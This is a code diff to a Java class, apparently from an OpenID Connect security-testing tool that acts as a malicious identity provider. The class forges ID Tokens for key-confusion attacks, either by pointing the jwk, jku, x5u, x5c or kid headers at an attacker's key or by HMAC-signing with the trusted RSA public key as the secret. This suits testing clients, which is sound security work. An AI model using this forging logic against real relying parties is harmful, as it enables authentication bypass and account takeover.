@@ -208,7 +208,7 @@ public class KeyConfusionOP extends DefaultOP {
 	 * various JWT Header fields lure the client to use the signing key included in the ID Token or to request
 	 * the key from an untrustworthy URL (which has not been announced during Discovery but is included in the token)
 	 */
-    private SignedJWT getKeyConfusionJWT(JWTClaimsSet claims) throws JOSEException, CertificateEncodingException {
+    private SignedJWT getKeyConfusionJWT(JWTClaimsSet claims) throws JOSEException, CertificateEncodingException, ParseException {
     	// A Key that is unknown to the client
 		KeyStore.PrivateKeyEntry untrustedEntry = opivCfg.getUntrustedSigningEntry();
         RSAKey key = getSigningJwk(untrustedEntry);
@@ -242,9 +242,7 @@ public class KeyConfusionOP extends DefaultOP {
 		} else if (params.getBool(IDTOKEN_SPOOFED_JKU_AS_JWK)) {
 			jsonHeader.put("jwk", untrustedKeyUri.toString());
 			jsonHeader.putIfAbsent("alg", algorithm);
-			//TODO
-//			untrustedKeyResponseString = key.toPublicKey().toString();
-			untrustedKeyResponseString = new JWKSet(key.toPublicJWK()).toString(); //TODO outerscope
+			untrustedKeyResponseString = new JWKSet(key.toPublicJWK()).toString(); 
 		}
 
 		// x5c KeyConfusion - the signin key is included in the token's x5c member
@@ -295,35 +293,34 @@ public class KeyConfusionOP extends DefaultOP {
 				keySet.add(key);
 			}
 			JWKSet jwkSet = new JWKSet(keySet);
-			untrustedKeyResponseString = jwkSet.toString();//TODO outerscope
+			untrustedKeyResponseString = jwkSet.toString();
 		} else if (params.getBool(IDTOKEN_SPOOFED_X5U)) {
 			// x5u points to unknown URI that responds with the x509 cert corresponding to the signing key
 			jsonHeader.putIfAbsent("alg", algorithm);
 			jsonHeader.put("x5u", untrustedKeyUri.toString());
-
-			untrustedKeyResponseString = untrustedEntry.getCertificate().toString(); // should be a x509 cert, not json
-//			System.out.println(untrustedKeyResponseString); // TODO test this...
+			
+			// TODO test this, should be a x509 cert, not json
+			untrustedKeyResponseString = untrustedEntry.getCertificate().toString(); 
+			System.out.println(untrustedKeyResponseString); 
 		}
 
-
-
 		/* *********************************** */
-		/* Highly speculative and experimental */
+		/* Speculative / experimental  tests */
 
 		// invalid kid field values (URI or JWK)
 		if (params.getBool(IDTOKEN_SPOOFED_JKU_AS_KID)) {
 			jsonHeader.putIfAbsent("alg", algorithm);
-
+			
 			jsonHeader.appendField("kid", untrustedKeyUri.toString());
 			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
-			untrustedKeyResponseString = jwkSet.toString(); //TODO outerscope
+			untrustedKeyResponseString = jwkSet.toString(); 
 		}
 		if (params.getBool(IDTOKEN_SPOOFED_JWK_AS_KID)) {
 			jsonHeader.putIfAbsent("alg", algorithm);
 
 			jsonHeader.appendField("kid", key.toPublicJWK());
 			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
-			untrustedKeyResponseString = jwkSet.toString(); //TODO outerscope
+			untrustedKeyResponseString = jwkSet.toString(); 
 		}
 
 		// invalid jwk field that points to a untrusted JKU, i.e., {..., jwk: {jku:untrustedURI, ...}}
@@ -337,7 +334,7 @@ public class KeyConfusionOP extends DefaultOP {
 			jsonHeader.put("jwk", jwk);
 
 			JWKSet jwkSet = new JWKSet(key.toPublicJWK());
-			untrustedKeyResponseString = jwkSet.toString();//TODO outerscope
+			untrustedKeyResponseString = jwkSet.toString();
 		}
 		/* *********************************** */
 
@@ -364,7 +361,7 @@ public class KeyConfusionOP extends DefaultOP {
 			jsonHeader.put("crit", arr);
 		}
 
-		// actual generation and signing of the JWT (only if jsonHeader has been marked with alg:RS256)
+		// actual RSA signing of the JWT (only if jsonHeader has been marked with alg:RS256)
 		if (jsonHeader.getOrDefault("alg", null) == "RS256") {
 			JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.RS256)
 					// note: using .parsedBase64URL() can override the JWSAlgorithm set in the Builder's constructor
@@ -375,15 +372,16 @@ public class KeyConfusionOP extends DefaultOP {
 
 			return signedJwt;
 		}
-		// end RSA Type
+		/* end RSA KeyConfusion */
+		/************************/
 
-
+		/************************************/
 		/* HMAC based key confusion attacks */
 
 		// make sure we use the correct "alg"
 		jsonHeader.remove("alg");
 		algorithm = "HS256";
-		String macKey = "default-value";
+		byte [] macKey = {0x00};
 		JSONObject trustedJwkJSON = trustedKey.toPublicJWK().toJSONObject();
 
 		if (params.getBool(IDTOKEN_SPOOFED_SECRET_KEY_)) {
@@ -396,34 +394,35 @@ public class KeyConfusionOP extends DefaultOP {
 				octJwk.put("kid", jsonHeader.get("kid"));
 			}
 			jsonHeader.put("jwk", octJwk);
-			macKey = octJwk.getAsString("k");
-		} // TODO: missing variant: w new registration and HS256 in OPMeta (default only announces RS256 and none);
-
+			// the JWKs k member needs Base64URL decoding
+			macKey = org.apache.commons.codec.binary.Base64.decodeBase64(octJwk.getAsString("k"));
+		}
+		
 		// using (parts of) trusted Public RSAKey as HMAC Key
+		// RS256 is announced in OP Configuration responses, HS256 is mandatory for clients
 		if (params.getBool(IDTOKEN_HMAC_PUBKEY_e)) {
-			macKey = trustedJwkJSON.getAsString("e");
+			macKey = trustedJwkJSON.getAsString("e").getBytes();
 			jsonHeader.putIfAbsent("alg", algorithm);
 		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_alg)) {
-			macKey = trustedJwkJSON.getAsString("alg");
+			macKey = trustedJwkJSON.getAsString("alg").getBytes();
 			jsonHeader.putIfAbsent("alg", algorithm);
 		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_kty)) {
-			macKey = trustedJwkJSON.getAsString("kty");
+			macKey = trustedJwkJSON.getAsString("kty").getBytes();
 			jsonHeader.putIfAbsent("alg", algorithm);
 		} else if (params.getBool(IDTOKEN_HMAC_PUBKKEY_n)) {
-			macKey = trustedJwkJSON.getAsString("n");
+			macKey = trustedJwkJSON.getAsString("n").getBytes();
 			jsonHeader.putIfAbsent("alg", algorithm);
 		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_JWKSTRING)) {
-			macKey = trustedJwkJSON.toString();
+			macKey = trustedJwkJSON.toString().getBytes();
 			jsonHeader.putIfAbsent("alg", algorithm);
-//			System.out.println(macKey); // TODO: doublecheck correctness
-			// TODO: add a variant without JSON string escaping (/ => \/)
+			// TODO: add a variant without JSON string escaping like "/" => "\/" ?
 		}
-		// TODO: these tests require that RS256 was announced in discovery while signing w. HS256
 
 		// make sure the trusted signing key returned from the trusted JWKS Endpoint includes the same kid
 		// (only works if new discovery/registration is enforced)
 		if (jsonHeader.containsKey("kid")) {
-			//TODO: this is problematic, as the jwks could be requested and cached during discovery
+			// TODO: the jwks could have been requested and cached during discovery
+			// in which case the kid stored here would not be used...
 			stepCtx.put(OPContextConstants.SIGNING_JWK_KEYID, jsonHeader.getAsString("kid"));
 		}
 
@@ -432,34 +431,58 @@ public class KeyConfusionOP extends DefaultOP {
 			String pkcs1KeyString = KeyConfusionHelper.convertPKCS8toPKCS1PemString(publicKey);
 			if (pkcs1KeyString == null) {
 				logger.log("Key conversion failed");
-				throw new CertificateEncodingException("Error converting JWK to PEM");
+				throw new ParseException("Error converting JWK to PEM");
 			}
 			String payloadType = params.get(P1_KEY_CONFUSION_PAYLOAD_TYPE);
 			try {
-				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType), pkcs1KeyString);
+				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType),
+						pkcs1KeyString).getBytes();
 			} catch (IllegalArgumentException e) {
 				logger.log("Unknown Payload type " + payloadType);
-				throw new CertificateEncodingException("Error converting JWK to PEM");
+				throw new ParseException("Error converting JWK to PEM");
 			}
 			jsonHeader.putIfAbsent("alg", algorithm);
 
 		} else if (params.getBool(IDTOKEN_HMAC_PUBKEY_PKCS8)) {
 			String payloadType = params.get(P8_KEY_CONFUSION_PAYLOAD_TYPE);
 			try {
-				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType), publicKey);
+				macKey = KeyConfusionHelper.transformKeyByPayload(KeyConfusionPayloadType.valueOf(payloadType),
+						publicKey).getBytes();
 			} catch (IllegalArgumentException | UnsupportedEncodingException e) {
-				logger.log("Unknown Payload type  or unsupporte key encoding");
-				throw new CertificateEncodingException(e);
+				logger.log("Unknown Payload type or unsupported key encoding");
+				throw new ParseException(e.getMessage());
 			}
 			jsonHeader.putIfAbsent("alg", algorithm);
 
 		}
 		
 		// actual "signing"
-		logger.log("Using MAC key: " + macKey);
-		// TODO: make sure macKey has been set (!= "default-value")
+//		logger.log("Using MAC key: " + macKey);
+//		logger.log("Using MAC key bytes: " + Arrays.toString(macKey));
+		// TODO: make sure macKey has been set (!= 0x00)
+
 		JWSHeader header = new JWSHeader.Builder(JWSAlgorithm.HS256)
 				.parsedBase64URL(Base64URL.encode(jsonHeader.toJSONString())).build();
+
+		if (macKey.length < 32) {
+			// TODO: as per RFC7520, Section 3.5, keys should be left-padded with
+			// leading zeros to reach the min length of 32 bytes for HS256.
+			// Maybe add as a further variant?
+			String part1 = Base64URL.encode(header.toString()).toString();
+			String part2 = Base64URL.encode(claims.toString()).toString();
+			String parts = part1 + "." + part2;
+			try {
+				byte[] mac = KeyConfusionHelper.generateMac("HmacSHA256", macKey, parts.getBytes());
+//				logger.log("parts used: " + parts);
+//				logger.log("mac computed: " + Base64URL.encode(mac).toString());
+//				logger.log("mac bytes: " + Arrays.toString(mac));
+				return new SignedJWT(Base64URL.encode(header.toString()), Base64URL.encode(claims.toString()), Base64URL.encode(mac));
+			} catch (java.text.ParseException e) {
+				logger.log("Mac generation failed");
+				throw new ParseException(e.getMessage());
+			}
+		}
+
 		SignedJWT signedJWT = new SignedJWT(header, claims);
 
 		JWSSigner signer = new MACSigner(macKey);
@@ -467,10 +490,11 @@ public class KeyConfusionOP extends DefaultOP {
 
 		return signedJWT;
 	}
-	
+
+	/**
+	 * KeyConfusion with SessionOverwriting
+	 */
     private SignedJWT sessionOverwritingKeyConfusion(JWTClaimsSet claims) throws GeneralSecurityException {
-//		logger.log("hmackkeyconfusion");
-        
 		// replace client ID (use same ID for evil and honest
         OIDCClientInformation cinfo = (OIDCClientInformation) stepCtx.get(OPContextConstants.REGISTERED_CLIENT_INFO_EVIL);
         logger.log(cinfo.getOIDCMetadata().toString());
